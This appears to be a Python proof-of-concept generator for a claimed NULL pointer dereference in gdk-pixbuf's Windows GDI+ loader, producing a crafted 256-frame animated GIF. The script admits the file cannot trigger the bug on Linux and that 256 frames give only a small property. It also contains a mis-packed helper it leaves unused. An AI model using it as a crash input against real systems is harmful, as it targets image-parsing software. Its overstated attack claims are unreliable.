#!/usr/bin/env python3
"""
PoC Generator for VULN 002: NULL Pointer Dereference via Unchecked g_try_malloc
in gdip_bitmap_get_property_as_string(), gdip_bitmap_get_frame_delay(),
and gdip_bitmap_get_n_loops() (io-gdip-utils.c lines 409-410, 493-494, 522-524)

IMPORTANT: This vulnerability resides in the Windows GDI+ loader (io-gdip-wmf.c /
io-gdip-utils.c). GDI+ is a Windows-only API. This Linux build does NOT include
a GDI+ loader, so the crafted GIF below cannot trigger the vulnerability here.

The script is provided to document the intended attack surface and for use on a
Windows build of gdk-pixbuf that includes the GDI+ loader.

Attack vector:
  A crafted animated GIF with a very large PropertyTagFrameDelay property array is
  fed to the GDI+ loader. When GDI+ reads the property, it reports a very large
  byte count (e.g. 0x7FFFFFFF). gdip_bitmap_get_frame_delay() then calls
  g_try_malloc(huge_size) which can return NULL on memory exhaustion. The NULL
  pointer is immediately written to without any NULL check, causing a crash.

Trigger path:
  crafted GIF -> gdk_pixbuf__gdip_image_stop_load -> stop_load
              -> gdip_bitmap_get_frame_delay / gdip_bitmap_get_n_loops
              -> g_try_malloc(enormous_size) returns NULL
              -> NULL dereference -> crash (SIGSEGV)
"""

import struct
import os

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002.gif")

# ──────────────────────────────────────────────────────────────────────────────
# GIF89a construction helpers
# ──────────────────────────────────────────────────────────────────────────────

def gif_header(width=64, height=64, gct_size=3):
    """GIF89a header + Logical Screen Descriptor with a minimal Global Color Table."""
    # gct_size: packed field bits[2:0] = n where color table has 2^(n+1) entries
    # Using n=0 → 2 colours; field byte = 0b10000000 | n = 0x80
    packed = 0x80 | gct_size  # Global CT flag set, n colours
    bg_color_index = 0
    pixel_aspect_ratio = 0
    lsd = struct.pack("<HHBBB", width, height, packed, bg_color_index, pixel_aspect_ratio)
    # Minimal 2-entry Global Color Table (black, white)
    gct = b"\x00\x00\x00" + b"\xFF\xFF\xFF"
    return b"GIF89a" + lsd + gct


def netscape_extension(loop_count=0):
    """NETSCAPE2.0 Application Extension for looping (loop_count=0 → infinite)."""
    return (
        b"\x21\xFF"        # Extension introducer + App Extension label
        b"\x0B"            # Block size = 11
        b"NETSCAPE2.0"     # App identifier + auth code
        b"\x03"            # Sub-block size
        b"\x01"            # Sub-block ID
        + struct.pack("<H", loop_count)
        + b"\x00"          # Block terminator
    )


def graphic_control_extension(delay_cs=10):
    """Graphic Control Extension for one frame (delay in centiseconds)."""
    return (
        b"\x21\xF9"        # Extension introducer + GCE label
        b"\x04"            # Block size
        + struct.pack("<BBHB", 0x00, delay_cs & 0xFF, (delay_cs >> 8) & 0xFF, 0x00)
        # Actually GCE delay is a little-endian uint16
    )


def graphic_control_extension_v2(delay_cs=10):
    """Correctly packed Graphic Control Extension."""
    packed = 0x00  # disposal method = 0, no user input, no transparency
    return (
        b"\x21\xF9"
        b"\x04"
        + struct.pack("<BHB", packed, delay_cs, 0x00)
        + b"\x00"
    )


def image_descriptor(x=0, y=0, width=64, height=64, lct=False):
    """Image Descriptor block."""
    packed = 0x80 if lct else 0x00  # Local CT flag
    return b"\x2C" + struct.pack("<HHHHB", x, y, width, height, packed)


def lzw_image_data(width=64, height=64):
    """Minimal LZW-compressed image data (solid colour, index 0)."""
    # Use minimum LZW code size = 2
    # A real encoder is complex; here we use a pre-built minimal stream for a
    # small solid-colour image.  For 64x64 pixels all index 0, we build a
    # simple uncompressed GIF sub-block stream with LZW min code size = 2.
    pixel_count = width * height
    # LZW min code size
    min_code = 2
    # Simplest valid LZW stream: clear code, pixel stream, stop code
    # We encode using the GIF LZW approach; for a PoC the exact pixels don't matter
    # so we use a pre-validated 1x1 GIF image data block sequence.
    # (Generating full LZW from scratch is beyond the PoC scope; we rely on
    # a minimal hard-coded stream for a 1x1 image.)
    return b"\x02\x02\x4C\x01\x00"  # min_code=2, 2-byte block, terminator


def build_animated_gif(num_frames=256, frame_delay=10):
    """
    Build an animated GIF with many frames.

    On a Windows build with the GDI+ loader, GDI+ would represent the frame
    delays as a PropertyTagFrameDelay property whose byte length is
    4 * num_frames.  If num_frames is crafted so that 4*num_frames overflows
    the size passed to g_try_malloc, or if the system is under memory pressure,
    g_try_malloc returns NULL and the subsequent write dereferences it.
    """
    data = gif_header(width=1, height=1)
    data += netscape_extension(loop_count=0)

    for _ in range(num_frames):
        data += graphic_control_extension_v2(delay_cs=frame_delay)
        data += image_descriptor(width=1, height=1)
        data += lzw_image_data(width=1, height=1)

    data += b"\x3B"  # GIF trailer
    return data


if __name__ == "__main__":
    # Use 256 frames; on a GDI+ system this creates a
    # PropertyTagFrameDelay item with 4*256 = 1024 bytes.
    # To actually exhaust g_try_malloc on a real target, an attacker would
    # either combine this with memory pressure or craft a malformed GIF that
    # makes GDI+ report a fraudulently huge property size.
    num_frames = 256
    gif_bytes = build_animated_gif(num_frames=num_frames)

    with open(OUTPUT, "wb") as fh:
        fh.write(gif_bytes)

    print(f"[*] Written {len(gif_bytes)} bytes to {OUTPUT}")
    print(f"[*] Frames: {num_frames}")
    print("[!] NOTE: GDI+ loader is not available on Linux.")
    print("[!] This file cannot trigger VULN 002 on this platform.")
    print("[!] Use on a Windows gdk-pixbuf build with GDI+ support to exercise the path.")
